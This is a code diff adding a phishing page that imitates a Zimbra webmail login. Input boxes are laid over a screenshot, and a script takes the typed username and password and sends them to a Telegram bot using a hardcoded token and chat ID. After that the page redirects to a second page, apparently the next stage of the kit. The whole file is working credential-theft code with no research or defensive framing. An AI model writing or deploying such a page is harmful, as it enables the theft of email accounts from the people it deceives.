@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+  <title>Zimbra</title>
+</head>
+
+<body>
+  <img src="zimbra.png" width="1250" height="570" />
+
+  <form onsubmit="sendTelegramMessage(event)">
+    <input name="username" id="username" type="text" required style="position: absolute; width: 295px; left: 489px; top: 248px; z-index: 6; height: 18px;" />
+    <input name="password" id="password" type="password" required style="position: absolute; width: 295px; left: 487px; top: 315px; z-index: 6; height: 18px;" />
+    <input type="submit" style="position: absolute; width: 121px; left: 475px; top: 362px; opacity: 0; z-index: 9; height: 41px;" value="Submit" />
+  </form>
+
+  <script>
+    function sendTelegramMessage(event) {
+      event.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const token = "7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo";
+      const chatId = "1920675677";
+      const message = `?? Zimbra Login\n?? Username: ${username}\n?? Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "2.html";
+        } else {
+          alert("Failed to send data to Telegram.");
+        }
+      })
+      .catch(error => {
+        console.error("Telegram error:", error);
+        alert("Error occurred. Try again.");
+      });
+    }
+  </script>
+</body>
+</html>
